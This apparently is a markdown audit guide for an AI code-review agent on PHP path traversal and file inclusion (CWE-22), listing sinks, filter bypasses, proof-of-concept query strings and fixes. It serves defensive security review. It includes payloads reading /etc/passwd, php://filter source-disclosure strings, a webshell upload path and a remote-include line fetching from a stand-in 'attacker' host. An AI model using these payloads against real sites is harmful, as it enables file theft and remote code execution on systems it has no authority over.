# PHP — Path Traversal / LFI / LFD Audit Skill (CWE-22)

## Sink inventory

- Read: `file_get_contents`, `fopen`, `fread`, `readfile`, `file`,
  `parse_ini_file`, `include`, `require`, `include_once`,
  `require_once`.
- Write: `file_put_contents`, `fwrite`, `move_uploaded_file`,
  `rename`, `copy`.
- Delete: `unlink`, `rmdir`.

## Exploit primitives by sink

- `include`/`require` with attacker path = **RCE** (LFI → RCE via
  `php://filter`, `data://`, or includes of uploaded files).
- `file_get_contents` / `readfile` = arbitrary file read.
- `move_uploaded_file($_FILES['x']['tmp_name'], $userPath)` = write
  webshell to web root.

## Decision flow

1. Find the path expression: a literal? a variable? what's the
   source? Use `tldr__tldr_extract` if not in the audit_pack.
2. Look for normalization: `realpath()` (returns false on
   nonexistent paths; checks against a base dir afterwards), or
   manual `str_replace("../", "", $x)` (**bypassable**: `....//` or
   double encoding `%252e%252e`).
3. Confirm the base directory check happens *after* normalization
   and uses `str_starts_with($real, $base . DIRECTORY_SEPARATOR)`
   (or equivalent). A simple `strpos($x, '../') === false` is
   bypassable.

## Common bypasses

- `....//` collapsed by `str_replace` once → `../`
- Null byte (`%00`) — patched in PHP 5.3.4+ but still seen in 7.0+
  via path-handling bugs.
- Windows: `..\..\` mixed with `/`, NTFS ADS `:$DATA`.
- URL wrappers: `php://filter/convert.base64-encode/resource=file.php`
  to read source; `data://text/plain;base64,<payload>` and
  `phar://` for deserialization.

## Tool hints

- `ripgrep__search` for `realpath` / `basename` / `dirname` /
  `str_replace` on the variable.
- `tldr__tldr_calls` to see if the sink is wrapped by a helper that
  does the validation centrally.

## POC templates

LFI read: `?file=../../../../etc/passwd`
LFI source: `?file=php://filter/convert.base64-encode/resource=index`
LFD write: upload + `?path=/var/www/html/shell.php`
RFI (only when `allow_url_include` is on, rare): `?file=https://attacker/poc.txt`

## Fix recommendations

1. Hard allowlist: map user value to a key, key to filename.
2. If a free-form path is necessary, resolve with `realpath()` and
   `str_starts_with($real, $baseReal . DIRECTORY_SEPARATOR)`. Also
   reject paths whose final component matches `\.php$` for upload
   endpoints.
3. Set `allow_url_fopen=Off` and `allow_url_include=Off` in
   `php.ini` for hardening.
